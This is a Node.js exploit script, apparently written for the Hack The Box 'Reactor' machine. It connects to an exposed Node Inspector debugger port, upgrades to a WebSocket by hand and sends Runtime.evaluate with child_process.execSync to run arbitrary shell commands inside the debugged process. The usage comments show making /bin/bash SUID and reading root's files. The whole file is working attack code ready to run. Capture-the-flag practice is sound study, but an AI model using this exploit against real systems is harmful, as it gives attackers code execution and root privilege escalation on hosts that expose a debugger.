#!/usr/bin/env node
// Node.js Inspector (Chrome DevTools Protocol) RCE.
//
// Target: a process started with --inspect / --inspect-brk exposing the
// debugger WebSocket (default 127.0.0.1:9229). Anyone who can reach that
// port executes arbitrary JS *inside that process* -> code exec as whatever
// user owns it. When the debugged process runs as root, this is a root RCE.
//
// Zero external deps (no `ws` module): raw TCP + a hand-rolled masked
// WebSocket text frame. Runs anywhere `node` exists.
//
// Usage (on the target host, in a shell that can reach the inspector):
//   node node_inspector_rce.js 'id'
//   node node_inspector_rce.js 'chmod +s /bin/bash'
//   node node_inspector_rce.js 'cat /root/root.txt'
//   HOST=127.0.0.1 PORT=9229 node node_inspector_rce.js 'id'
//
// HTB Reactor: root ran `node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js`.

const http = require('http');
const crypto = require('crypto');
const net = require('net');

const HOST = process.env.HOST || '127.0.0.1';
const PORT = parseInt(process.env.PORT || '9229', 10);
const CMD = process.argv.slice(2).join(' ') || 'id';

// 1) Ask the inspector for its live debug targets -> webSocketDebuggerUrl.
http.get({ host: HOST, port: PORT, path: '/json/list' }, res => {
  let d = '';
  res.on('data', c => (d += c));
  res.on('end', () => {
    let target;
    try {
      target = JSON.parse(d).find(x => x.webSocketDebuggerUrl);
    } catch (e) {
      console.error('[-] Could not parse /json/list — is the inspector open on ' + HOST + ':' + PORT + '?');
      console.error(d);
      process.exit(1);
    }
    if (!target) {
      console.error('[-] No webSocketDebuggerUrl in /json/list response.');
      process.exit(1);
    }

    // ws://127.0.0.1:9229/<uuid>  ->  path "/<uuid>"
    const path = '/' + target.webSocketDebuggerUrl.split('/').slice(3).join('/');
    const key = crypto.randomBytes(16).toString('base64');

    // 2) Open the raw socket and do the WebSocket upgrade by hand.
    const s = net.connect(PORT, HOST, () =>
      s.write(
        `GET ${path} HTTP/1.1\r\n` +
        `Host: ${HOST}:${PORT}\r\n` +
        `Upgrade: websocket\r\n` +
        `Connection: Upgrade\r\n` +
        `Sec-WebSocket-Key: ${key}\r\n` +
        `Sec-WebSocket-Version: 13\r\n\r\n`
      )
    );

    let buf = Buffer.alloc(0);
    let upgraded = false;

    s.on('data', chunk => {
      buf = Buffer.concat([buf, chunk]);

      // 3) Once the 101 handshake is done, fire Runtime.evaluate.
      if (!upgraded) {
        const i = buf.indexOf('\r\n\r\n');
        if (i < 0) return;
        upgraded = true;
        buf = buf.slice(i + 4);
        const expr =
          `global.process.mainModule.require('child_process')` +
          `.execSync(${JSON.stringify(CMD)}, {encoding:'utf8'})`;
        s.write(
          frame(
            JSON.stringify({
              id: 1,
              method: 'Runtime.evaluate',
              params: { expression: expr, includeCommandLineAPI: true },
            })
          )
        );
      }

      // 4) Parse server->client frames (unmasked) until we get id:1 back.
      while (buf.length >= 2) {
        let len = buf[1] & 0x7f;
        let off = 2;
        if (len === 126) {
          if (buf.length < 4) break;
          len = buf.readUInt16BE(2);
          off = 4;
        } else if (len === 127) {
          if (buf.length < 10) break;
          len = Number(buf.readBigUInt64BE(2));
          off = 10;
        }
        if (buf.length < off + len) break;
        const payload = buf.slice(off, off + len).toString();
        buf = buf.slice(off + len);
        try {
          const m = JSON.parse(payload);
          if (m.id === 1) {
            if (m.result && m.result.result && 'value' in m.result.result) {
              process.stdout.write(String(m.result.result.value));
            } else {
              console.log(JSON.stringify(m.result));
            }
            s.end();
            process.exit(0);
          }
        } catch (_) {
          /* not our JSON frame; keep reading */
        }
      }
    });

    s.on('error', e => {
      console.error('[-] socket error: ' + e.message);
      process.exit(1);
    });
  });
}).on('error', e => {
  console.error('[-] HTTP error hitting /json/list: ' + e.message);
  process.exit(1);
});

// Client->server WebSocket frames MUST be masked (RFC 6455).
function frame(data) {
  const p = Buffer.from(data);
  const len = p.length;
  const mask = crypto.randomBytes(4);
  let h;
  if (len < 126) {
    h = Buffer.alloc(2);
    h[1] = 0x80 | len;
  } else if (len < 65536) {
    h = Buffer.alloc(4);
    h[1] = 0x80 | 126;
    h.writeUInt16BE(len, 2);
  } else {
    h = Buffer.alloc(10);
    h[1] = 0x80 | 127;
    h.writeBigUInt64BE(BigInt(len), 2);
  }
  h[0] = 0x81; // FIN + text opcode
  const m = Buffer.alloc(len);
  for (let i = 0; i < len; i++) m[i] = p[i] ^ mask[i % 4];
  return Buffer.concat([h, mask, m]);
}
